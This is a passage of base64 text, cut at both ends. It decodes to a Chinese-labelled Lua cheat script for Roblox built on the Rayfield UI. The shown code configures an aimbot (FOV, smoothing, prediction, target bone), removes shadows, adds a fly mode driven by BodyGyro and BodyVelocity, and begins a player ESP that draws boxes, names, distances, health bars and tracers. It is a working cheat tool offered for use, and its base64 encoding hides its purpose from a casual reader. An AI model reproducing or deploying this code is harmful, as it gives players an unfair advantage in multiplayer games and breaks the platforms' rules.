DcmVhdGVJbnB1dCh7CiAgICAgICAgTmFtZSA9ICLljYrlvoTvvIjovpPlhaXvvIkiLAogICAgICAgIFBsYWNlaG9sZGVyVGV4dCA9IHRvc3RyaW5nKGZpeGVkRk9WKSwKICAgICAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHR4dCkgCiAgICAgICAgICAgIGxvY2FsIG4gPSB0b251bWJlcih0eHQpIAogICAgICAgICAgICBpZiBuIHRoZW4gCiAgICAgICAgICAgICAgICBmaXhlZEZPViA9IG4KICAgICAgICAgICAgICAgIGZpeGVkRm92Q2lyY2xlLlJhZGl1cyA9IG4KICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVTZWN0aW9uKCLpgJrnlKjlj4LmlbAiKQogICAgVGFiMzpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAi5bmz5ruR57O75pWw77yI5ruR5p2h77yJIiwKICAgICAgICBSYW5nZSA9IHswLCAxfSwKICAgICAgICBJbmNyZW1lbnQgPSAwLjAxLAogICAgICAgIFN1ZmZpeCA9ICIiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGFpbWJvdFNtb290aCwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGFpbWJvdFNtb290aCA9IHYgZW5kCiAgICB9KQogICAgCiAgICBUYWIzOkNyZWF0ZUlucHV0KHsKICAgICAgICBOYW1lID0gIuW5s+a7keezu+aVsO+8iOi+k+WFpe+8iSIsCiAgICAgICAgUGxhY2Vob2xkZXJUZXh0ID0gdG9zdHJpbmcoYWltYm90U21vb3RoKSwKICAgICAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3QgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHR4dCkgCiAgICAgICAgICAgIGxvY2FsIG4gPSB0b251bWJlcih0eHQpIAogICAgICAgICAgICBpZiBuIHRoZW4gCiAgICAgICAgICAgICAgICBhaW1ib3RTbW9vdGggPSBuCiAgICAgICAgICAgIGVuZCAKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlU2xpZGVyKHsKICAgICAgICBOYW1lID0gIumihOa1iyAo56eSKe+8iOa7keadoe+8iSIsCiAgICAgICAgUmFuZ2UgPSB7MCwgMX0sCiAgICAgICAgSW5jcmVtZW50ID0gMC4wMSwKICAgICAgICBTdWZmaXggPSAicyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gYWltYm90UHJlZGljdGlvbiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpIGFpbWJvdFByZWRpY3Rpb24gPSB2IGVuZAogICAgfSkKICAgIAogICAgVGFiMzpDcmVhdGVJbnB1dCh7CiAgICAgICAgTmFtZSA9ICLpooTmtYsgKOenkinvvIjovpPlhaXvvIkiLAogICAgICAgIFBsYWNlaG9sZGVyVGV4dCA9IHRvc3RyaW5nKGFpbWJvdFByZWRpY3Rpb24pLAogICAgICAgIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odHh0KSAKICAgICAgICAgICAgbG9jYWwgbiA9IHRvbnVtYmVyKHR4dCkgCiAgICAgICAgICAgIGlmIG4gdGhlbiAKICAgICAgICAgICAgICAgIGFpbWJvdFByZWRpY3Rpb24gPSBuCiAgICAgICAgICAgIGVuZCAKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjM6Q3JlYXRlRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAi556E5YeG6aqo6aq8IiwKICAgICAgICBPcHRpb25zID0geyJIZWFkIiwiTmVjayIsIlVwcGVyVG9yc28iLCJIdW1hbm9pZFJvb3RQYXJ0In0sCiAgICAgICAgQ3VycmVudE9wdGlvbiA9IGFpbWJvdEJvbmUsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KSBhaW1ib3RCb25lID0gdiBlbmQKICAgIH0pCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDliKDpmaTpmLTlvbHvvIjlhajlsYDlvIDlhbPvvIkKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLliKDpmaTpmLTlvbEiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZ2FtZS5MaWdodGluZy5HbG9iYWxTaGFkb3dzID0gbm90IHYKICAgICAgICAgICAgZm9yIF8sIGwgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgaWYgbDpJc0EoIkJhc2VQYXJ0Iikgb3IgbDpJc0EoIk1lc2hQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgIGwuQ2FzdFNoYWRvdyA9IG5vdCB2CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICLmj5DnpLoiLAogICAgICAgICAgICAgICAgQ29udGVudCA9IHYgYW5kICLpmLTlvbHlt7LliKDpmaQiIG9yICLpmLTlvbHlt7LmgaLlpI0iLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAyLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4CiAgICAgICAgICAgIH0pCiAgICAgICAgZW5kCiAgICB9KQoKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDkvJjljJblkI7nmoTpo57ooYzlip/og70KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBsb2NhbCBmbHlpbmcgPSBmYWxzZQogICAgbG9jYWwgZmx5U3BlZWQgPSA1MAogICAgbG9jYWwgYmcsIGJ2CiAgICBsb2NhbCBjdHJsID0ge2YgPSAwLCBiID0gMCwgbCA9IDAsIHIgPSAwLCB1ID0gMCwgZCA9IDB9CiAgICBsb2NhbCBmbHlDb25uZWN0aW9uCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIGZseUxvb3AoKQogICAgICAgIHdoaWxlIGZseWluZyBhbmQgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OldhaXQoKSBkbwogICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHRvcnNvID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3IgCiAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJUb3JzbyIpIG9yIAogICAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVXBwZXJUb3JzbyIpCiAgICAgICAgICAgIGlmIG5vdCB0b3JzbyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgbW92ZURpcmVjdGlvbiA9IFZlY3RvcjMubmV3KGN0cmwuciAtIGN0cmwubCwgY3RybC51IC0gY3RybC5kLCBjdHJsLmIgLSBjdHJsLmYpCiAgICAgICAgICAgIGlmIG1vdmVEaXJlY3Rpb24uTWFnbml0dWRlID4gMCB0aGVuCiAgICAgICAgICAgICAgICBtb3ZlRGlyZWN0aW9uID0gbW92ZURpcmVjdGlvbi5Vbml0CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgY2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICAgICAgbG9jYWwgY2FtZXJhQ0ZyYW1lID0gY2FtZXJhLkNGcmFtZQogICAgICAgICAgICBsb2NhbCBjYW1lcmFMb29rVmVjdG9yID0gY2FtZXJhQ0ZyYW1lLkxvb2tWZWN0b3IKICAgICAgICAgICAgbG9jYWwgY2FtZXJhUmlnaHRWZWN0b3IgPSBjYW1lcmFDRnJhbWUuUmlnaHRWZWN0b3IKICAgICAgICAgICAgbG9jYWwgY2FtZXJhVXBWZWN0b3IgPSBjYW1lcmFDRnJhbWUuVXBWZWN0b3IKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHZlbG9jaXR5ID0gKGNhbWVyYUxvb2tWZWN0b3IgKiBtb3ZlRGlyZWN0aW9uLlogKiBmbHlTcGVlZCkgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgKGNhbWVyYVJpZ2h0VmVjdG9yICogbW92ZURpcmVjdGlvbi5YICogZmx5U3BlZWQpICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIChjYW1lcmFVcFZlY3RvciAqIG1vdmVEaXJlY3Rpb24uWSAqIGZseVNwZWVkKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgYnYgdGhlbgogICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSB2ZWxvY2l0eQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG1vdmVEaXJlY3Rpb24uTWFnbml0dWRlID4gMCBhbmQgYmcgdGhlbgogICAgICAgICAgICAgICAgYmcuQ0ZyYW1lID0gY2FtZXJhQ0ZyYW1lICogQ0ZyYW1lLkFuZ2xlcygKICAgICAgICAgICAgICAgICAgICAtbWF0aC5yYWQobW92ZURpcmVjdGlvbi5aICogMTUpLAogICAgICAgICAgICAgICAgICAgIG1hdGgucmFkKG1vdmVEaXJlY3Rpb24uWCAqIDE1KSwKICAgICAgICAgICAgICAgICAgICAwCiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGxvY2FsIGZ1bmN0aW9uIHN0YXJ0Rmx5aW5nKCkKICAgICAgICBpZiBmbHlpbmcgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIG5vdCBjaGFyYWN0ZXIgdGhlbiAKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIumjnuihjOmUmeivryIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIuaJvuS4jeWIsOinkuiJsiIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICAgICAgfSkKICAgICAgICAgICAgcmV0dXJuIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIG5vdCBodW1hbm9pZCB0aGVuIAogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAi6aOe6KGM6ZSZ6K+vIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAi5om+5LiN5YiwSHVtYW5vaWQiLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHJldHVybiAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmbHlpbmcgPSB0cnVlCiAgICAgICAgCiAgICAgICAgbG9jYWwgdG9yc28gPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciAKICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVG9yc28iKSBvciAKICAgICAgICAgICAgICAgICAgICAgIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiVXBwZXJUb3JzbyIpCiAgICAgICAgaWYgbm90IHRvcnNvIHRoZW4gCiAgICAgICAgICAgIGZseWluZyA9IGZhbHNlCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICLpo57ooYzplJnor68iLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICLmib7kuI3liLDouqvkvZPpg6jkvY0iLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIHJldHVybiAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBiZyA9IEluc3RhbmNlLm5ldygiQm9keUd5cm8iLCB0b3JzbykKICAgICAgICBiZy5QID0gOWU0CiAgICAgICAgYmcubWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoOWU5LCA5ZTksIDllOSkKICAgICAgICBiZy5jZnJhbWUgPSB0b3Jzby5DRnJhbWUKICAgICAgICAKICAgICAgICBidiA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IiwgdG9yc28pCiAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLjEsIDApCiAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyg5ZTksIDllOSwgOWU5KQogICAgICAgIAogICAgICAgIGh1bWFub2lkLlBsYXRmb3JtU3RhbmQgPSB0cnVlCiAgICAgICAgCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgVGl0bGUgPSAi6aOe6KGM5qih5byPIiwKICAgICAgICAgICAgQ29udGVudCA9ICLpo57ooYzlt7LlkK/nlKggKOmAn+W6pjogIiAuLiBmbHlTcGVlZCAuLiAiKSIsCiAgICAgICAgICAgIER1cmF0aW9uID0gMywKICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4CiAgICAgICAgfSkKICAgICAgICAKICAgICAgICBmbHlDb25uZWN0aW9uID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikuSGVhcnRiZWF0OkNvbm5lY3QoZmx5TG9vcCkKICAgIGVuZAogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBzdG9wRmx5aW5nKCkKICAgICAgICBpZiBub3QgZmx5aW5nIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGZseWluZyA9IGZhbHNlCiAgICAgICAgCiAgICAgICAgaWYgYmcgdGhlbiBiZzpEZXN0cm95KCkgYmcgPSBuaWwgZW5kCiAgICAgICAgaWYgYnYgdGhlbiBidjpEZXN0cm95KCkgYnYgPSBuaWwgZW5kCiAgICAgICAgaWYgZmx5Q29ubmVjdGlvbiB0aGVuIGZseUNvbm5lY3Rpb246RGlzY29ubmVjdCgpIGZseUNvbm5lY3Rpb24gPSBuaWwgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICBpZiBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICBodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBhbmltYXRlID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJBbmltYXRlIikKICAgICAgICAgICAgaWYgYW5pbWF0ZSB0aGVuCiAgICAgICAgICAgICAgICBhbmltYXRlLkRpc2FibGVkID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgY3RybCA9IHtmID0gMCwgYiA9IDAsIGwgPSAwLCByID0gMCwgdSA9IDAsIGQgPSAwfQogICAgICAgIAogICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgIFRpdGxlID0gIumjnuihjOaooeW8jyIsCiAgICAgICAgICAgIENvbnRlbnQgPSAi6aOe6KGM5bey56aB55SoIiwKICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgKICAgICAgICB9KQogICAgZW5kCiAgICAKICAgIGxvY2FsIGlucHV0QmVnYW5Db25uLCBpbnB1dEVuZGVkQ29ubgogICAgCiAgICBsb2NhbCBmdW5jdGlvbiBzZXR1cElucHV0KCkKICAgICAgICBpZiBpbnB1dEJlZ2FuQ29ubiB0aGVuIGlucHV0QmVnYW5Db25uOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICBpZiBpbnB1dEVuZGVkQ29ubiB0aGVuIGlucHV0RW5kZWRDb25uOkRpc2Nvbm5lY3QoKSBlbmQKICAgICAgICAKICAgICAgICBpbnB1dEJlZ2FuQ29ubiA9IGdhbWU6R2V0U2VydmljZSgiVXNlcklucHV0U2VydmljZSIpLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgaWYgbm90IGZseWluZyB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlcgdGhlbgogICAgICAgICAgICAgICAgY3RybC5mID0gMQogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuUyB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLmIgPSAxCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5BIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwubCA9IDEKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkQgdGhlbgogICAgICAgICAgICAgICAgY3RybC5yID0gMQogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuU3BhY2UgdGhlbgogICAgICAgICAgICAgICAgY3RybC51ID0gMQogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wgb3IgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuQnV0dG9uTDMgdGhlbgogICAgICAgICAgICAgICAgY3RybC5kID0gMQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICAgICAgCiAgICAgICAgaW5wdXRFbmRlZENvbm4gPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKS5JbnB1dEVuZGVkOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgIGlmIG5vdCBmbHlpbmcgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5XIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwuZiA9IDAKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlMgdGhlbgogICAgICAgICAgICAgICAgY3RybC5iID0gMAogICAgICAgICAgICBlbHNlaWYgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuQSB0aGVuCiAgICAgICAgICAgICAgICBjdHJsLmwgPSAwCiAgICAgICAgICAgIGVsc2VpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5EIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwuciA9IDAKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlNwYWNlIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwudSA9IDAKICAgICAgICAgICAgZWxzZWlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkxlZnRDb250cm9sIG9yIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLkJ1dHRvbkwzIHRoZW4KICAgICAgICAgICAgICAgIGN0cmwuZCA9IDAKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCiAgICAKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBzdG9wRmx5aW5nKCkKICAgIGVuZCkKICAgIAogICAgVGFiMjpDcmVhdGVTZWN0aW9uKCLpo57ooYzlip/og70iKQogICAgCiAgICBUYWIyOkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLlkK/nlKjpo57ooYwiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgaWYgdiB0aGVuCiAgICAgICAgICAgICAgICBzdGFydEZseWluZygpCiAgICAgICAgICAgICAgICBzZXR1cElucHV0KCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgc3RvcEZseWluZygpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKICAgIAogICAgVGFiMjpDcmVhdGVTbGlkZXIoewogICAgICAgIE5hbWUgPSAi6aOe6KGM6YCf5bqmIiwKICAgICAgICBSYW5nZSA9IHsxMCwgMjAwfSwKICAgICAgICBJbmNyZW1lbnQgPSA1LAogICAgICAgIFN1ZmZpeCA9ICLljZXkvY0iLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGZseVNwZWVkLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIGZseVNwZWVkID0gdmFsdWUKICAgICAgICAgICAgaWYgZmx5aW5nIHRoZW4KICAgICAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAi6aOe6KGM5qih5byPIiwKICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIumjnuihjOmAn+W6puabtOaWsOS4ujogIiAuLiBmbHlTcGVlZCwKICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4CiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjI6Q3JlYXRlTGFiZWwoIuaOp+WItuaWueW8jzoiKQogICAgVGFiMjpDcmVhdGVMYWJlbCgiVy9BL1MvRCAtIOWJjeWQjuW3puWPs+enu+WKqCIpCiAgICBUYWIyOkNyZWF0ZUxhYmVsKCLnqbrmoLzplK4gLSDlkJHkuIrpo57ooYwiKQogICAgVGFiMjpDcmVhdGVMYWJlbCgiQ3RybOmUriAtIOWQkeS4i+mjnuihjCIpCiAgICAKICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICAtLSDlop7lvLrniYjnjqnlrrYgRVNQ77yI5ZCr6Zif5LyN5qOA5rWL44CB6Led56a744CB6KGA5p2h5ZKM57q/5p2h57uY5Yi277yJLSDljYfnuqfkuLrni6znq4vlvIDlhbPplK4KICAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAgICBsb2NhbCBlc3BTZXR0aW5ncyA9IHsKICAgICAgICBlbmFibGVkID0gZmFsc2UsCiAgICAgICAgc2hvd0JveCA9IGZhbHNlLAogICAgICAgIHNob3dOYW1lID0gZmFsc2UsCiAgICAgICAgc2hvd0Rpc3RhbmNlID0gZmFsc2UsCiAgICAgICAgc2hvd0hlYWx0aEJhciA9IGZhbHNlLAogICAgICAgIHNob3dIZWFsdGhUZXh0ID0gZmFsc2UsCiAgICAgICAgc2hvd1RyYWNlciA9IGZhbHNlLAogICAgICAgIHRyYWNlclBvc2l0aW9uID0gIkJvdHRvbSIsCiAgICAgICAgc2hvd0VuZW15T25seSA9IGZhbHNlCiAgICB9CiAgICAKICAgIGxvY2FsIGVzcENhY2hlID0ge30KCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRUZWFtQ29sb3IocGxyKQogICAgICAgIGlmIHBsci5UZWFtIGFuZCBMb2NhbFBsYXllci5UZWFtIGFuZCBwbHIuVGVhbSA9PSBMb2NhbFBsYXllci5UZWFtIHRoZW4KICAgICAgICAgICAgcmV0dXJuIENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIHJldHVybiBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBpc1RlYW1tYXRlKHBscikKICAgICAgICBpZiBwbHIuVGVhbSBhbmQgTG9jYWxQbGF5ZXIuVGVhbSBhbmQgcGxyLlRlYW0gPT0gTG9jYWxQbGF5ZXIuVGVhbSB0aGVuCiAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIGZhbHNlCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBjcmVhdGVFU1BPYmplY3QocGxyKQogICAgICAgIGxvY2FsIGVzcCA9IHsKICAgICAgICAgICAgQm94ID0gRHJhd2luZy5uZXcoIlF1YWQiKSwKICAgICAgICAgICAgTmFtZSA9IERyYXdpbmcubmV3KCJUZXh0IiksCiAgICAgICAgICAgIERpc3RhbmNlID0gRHJhd2luZy5uZXcoIlRleHQiKSwKICAgICAgICAgICAgSGVhbHRoQmFyID0gRHJhd2luZy5uZXcoIlF1YWQiKSwKICAgICAgICAgICAgSGVhbHRoVGV4dCA9IERyYXdpbmcubmV3KCJUZXh0IiksCiAgICAgICAgICAgIFRyYWNlciA9IERyYXdpbmcubmV3KCJMaW5lIikKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgZXNwLkJveC5UaGlja25lc3MgPSAxLjUKICAgICAgICBlc3AuQm94LkZpbGxlZCA9IGZhbHNlCiAgICAgICAgZXNwLkJveC5aSW5kZXggPSA1CiAgICAgICAgCiAgICAgICAgZXNwLk5hbWUuU2l6ZSA9IDE4CiAgICAgICAgZXNwLk5hbWUuQ2VudGVyID0gdHJ1ZQogICAgICAgIGVzcC5OYW1lLk91dGxpbmUgPSB0cnVlCiAgICAgICAgZXNwLk5hbWUuWkluZGV4ID0gNgogICAgICAgIAogICAgICAgIGVzcC5EaXN0YW5jZS5TaXplID0gMTYKICAgICAgICBlc3AuRGlzdGFuY2UuQ2VudGVyID0gdHJ1ZQogICAgICAgIGVzcC5EaXN0YW5jZS5PdXRsaW5lID0gdHJ1ZQogICAgICAgIGVzcC5EaXN0YW5jZS5aSW5kZXggPSA2CiAgICAgICAgCiAgICAgICAgZXNwLkhlYWx0aEJhci5GaWxsZWQgPSB0cnVlCiAgICAgICAgZXNwLkhlYWx0aEJhci5UaGlja25lc3MgPSAxCiAgICAgICAgZXNwLkhlYWx0aEJhci5aSW5kZXggPSA1CiAgICAgICAgCiAgICAgICAgZXNwLkhlYWx0aFRleHQuU2l6ZSA9IDE0CiAgICAgICAgZXNwLkhlYWx0aFRleHQuQ2VudGVyID0gdHJ1ZQogICAgICAgIGVzcC5IZWFsdGhUZXh0Lk91dGxpbmUgPSB0cnVlCiAgICAgICAgZXNwLkhlYWx0aFRleHQuWkluZGV4ID0gNgogICAgICAgIAogICAgICAgIGVzcC5UcmFjZXIuVGhpY2tuZXNzID0gMS41CiAgICAgICAgZXNwLlRyYWNlci5aSW5kZXggPSA0CiAgICAgICAgCiAgICAgICAgZXNwQ2FjaGVbcGxyXSA9IGVzcAogICAgICAgIHJldHVybiBlc3AKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUVTUCgpCiAgICAgICAgaWYgbm90IGVzcFNldHRpbmdzLmVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGx